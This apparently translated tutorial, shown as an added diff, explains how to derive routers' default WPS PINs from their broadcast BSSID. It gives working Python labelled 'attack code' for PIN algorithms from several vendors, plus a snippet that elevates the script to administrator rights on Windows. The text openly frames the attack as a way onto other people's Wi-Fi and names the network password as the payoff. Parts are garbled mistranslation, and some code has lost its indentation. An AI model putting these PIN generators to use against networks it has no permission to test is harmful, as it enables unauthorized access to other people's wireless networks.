@@ -1,0 +1,172 @@
+There are times when you need to connect to Wi-Fi without knowing the password, say when you're in a coffee shop and feel embarrassed to ask him, or when you've been hired to pentest an organization's network. WPS technology has long helped hackers do both. In this article, we will see how to independently implement an attack based on the weaknesses of the WPS PIN generation algorithms.
+
+Most modern routers support the WPS (Wi-Fi Protected Setup) standard, which allows you to establish a secure connection between the device and the router in seconds, bypassing the stage of setting up encryption and entering a password. Devices are connected using a separate eight-digit WPS PIN key, which consists of numbers. The eighth digit is the digest.
+
+Of the variety of methods to thank a neighbor for hacking wireless access points with WPS, the following can be distinguished:
+
+selection of a PIN code or security key by brute force;
+exploiting implementation vulnerabilities;
+social engineering;
+exploiting weaknesses in PIN code generation.
+In this article, we will focus on the last method from the list.
+
+The WPS Pixie Dust attack is already obsolete, however, even today I see routers susceptible to it. The problem lies in the generation of random numbers and allows you not to break all eight numbers on the forehead, but to guess only four of them, since the rest can be obtained from the router's responses.
+
+Where do they get the standard PIN
+When we buy a router, it already contains a PIN obtained by a special WPS algorithm for the initial connection to the router via WPS. The WPS PIN consists of eight digits. How do manufacturers get it? Obviously something unique is needed to identify and generate different values. That's right - this is the MAC of the device, which we can get from the broadcast BSSID.
+
+BSSID (Basic Service Set Identifier) is a unique identifier for a wireless network. Often the BSSID is the same as the Ethernet MAC address of the device.
+
+WPS PIN generation by example
+As you already understood, everything starts with BSSID. We connect our sexual access point to the network. ¯\_(ツ)_/¯
+
+
+tp link router etc
+
+
+analyze it in any convenient way (for example, Dumpper).
+
+
+
+
+Dumpper tells us in a clear language about nearby wireless networks
+
+BSSID received: C4:6E:1F:6A:8D:04.
+
+It's time for adventure: we open the browser and start browsing various (including foreign) sites and forums to find out how the PIN code generation algorithms work for a particular network equipment manufacturer. If laziness is stronger than interest, then you can always “pull out” these functions from third-party open source software products.
+
+Suppose we found that most of the old routers of this vendor use the algorithm for generating a PIN code from the last three octets of the device's MAC address: 24-bit PIN = MAC[7..12].
+
+Here is an implementation of this algorithm in Python.
+
+from math import floor
+MAC = 'C46E1F6A8D04'
+One = Two = (int(MAC, 16) & 0xFFFFFF) % 10000000
+Var1 = 0
+while Two:
+Var1 += 3 * (Two % 10)
+Two = floor(Two / 10)
+Var1 += Two % 10
+Two = floor( Two / 10)
+Var2 = (One * 10) + ((10 - (Var1 % 10)) % 10)
+Var3 = str(int(Var2))
+result = Var3.zfill(8)
+The result of the script will be PIN code 69829161 Let's check its authenticity.
+
+
+
+
+The received WPS PIN is identical to the standard (factory)
+
+
+Preparation and requirements
+Let's get started. When developing our own utility for testing wireless access points, we need:
+
+Windows 7 and above;
+Python 3 and above;
+convenient IDE;
+favorite browser;
+personal Wi-Fi router with WPS technology "for torture";
+WpsWin (included in the same Dumpper);
+IDA and Hex-Rays Tool.
+Immediately, looking ahead, I will say that you will need to run the finished script with administrator rights. You can either agree with this and go directly to development, or read on.
+
+
+Autorun as admin
+To autorun we will use the following code:
+
+import ctypes, sys
+if ctypes.windll.shell32.IsUserAnAdmin():
+if __name__ == "__main__":
+main()
+else:
+ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+Now when you try to run the script, the call will be passed to UAC (if active) and a new terminal window will open, where our code will be executed as administrator.
+
+If this option does not suit you, then you can always use ready-made solutions.
+
+www
+pyuac - Ready-made script for elevating rights in Windows
+Bypassing Windows 10 UAC With Python - related article
+How to run python script with elevated privilege on windows - Stack Overflow
+
+Development
+First of all, let's add the algorithm for calculating the digest of the MAC address (it was already above):
+
+
+here is the attack code
+
+from math import floor
+def checksum(mac):
+  mac %= 10000000
+  var = 0
+  temp = mac
+  while temp:
+    var += 3 * (temp % 10)
+    temp = floor(temp / 10)
+    var += temp % 10
+    temp = floor(temp / 10)
+  return (mac * 10) + ((10 - (var % 10)) % 10)
+
+
+----------------------------------------------------------
+
+As well as several functions for generating treasured PIN codes.
+
+This is not a complete list of existing algorithms, so the remaining options will be your homework.
+
+---------------------------------------------------------
+
+def pin24(BSSID):
+  temp = int(BSSID,16) & 0xFFFFFF
+  temp = checksum(temp)
+  temp = str(int(temp))
+  return temp.zfill(8)
+
+def pinDLink(BSSID):
+  temp = (int(BSSID, 16) & 0xFFFFFF) ^ 0x55AA55
+  temp ^= ((temp & 0xF) << 4) | ((temp & 0xF) << 8) | ((temp & 0xF) << 12) | ((temp & 0xF) << 16) | ((temp & 0xF) << 20)
+  temp %= 10000000
+  if temp < 1000000:
+    temp += ((temp % 9) * 1000000) + 1000000
+  temp = checksum(temp)
+  temp = str(int(temp))
+  return temp.zfill(8)
+
+def pinDLinkInc1(BSSID):
+  temp = int(BSSID, 16) + 1
+  return pinDLink(hex(temp))
+
+def pinASUS(BSSID):
+  temp = format(int(BSSID, 16), '02x')
+  temp = str(temp).zfill(12)
+  var = [int(temp[0:2], 16), int(temp[2:4], 16), int(temp[4:6], 16), int(temp[6:8], 16),
+     int(temp[8:10], 16), int(temp[10:12], 16)]
+  pin = []
+  for i in range(7):
+    pin.append((var[i % 6] + var[5]) % (10 - ((i + var[1] + var[2] + var[3] + var[4] + var[5]) % 7)))
+  temp = int(''.join(str(i) for i in pin))
+  temp = checksum(temp)
+  temp = str(int(temp))
+  return temp.zfill(8)
+------------------------------------------------------------------------------------------------------------------
+
+Additional features
+If you, dear reader, want to modernize this code, then here are some interesting ideas for implementation.
+
+Rewrite the utility using the built-in cmd library that mimics the CLI.
+Think of another way to get a list of wireless networks.
+Find all possible WPS PIN generation algorithms from different manufacturers.
+Add a check to see if the wireless access point has WPS technology.
+Create a count of failed association attempts to help identify possible Lock or Firewalling on the wireless network.
+Add a sound alert when a valid PIN is found.
+
+Conclusions
+What we have from the results:
+
++10 intelligence skill for developing automated testing tools;
+a small list of PIN code generation algorithms;
+a working WPS PIN generation weakness testing utility;
+wireless network password.
+I can't help but say that vendors have been aware of this weakness for a long time, and the problem has most likely already been fixed in the latest firmware updates. Although sometimes I met “modern” access points, where MAC was used to generate a PIN code, increased (or decreased) by one, the share of vulnerable devices is getting smaller every day.
+
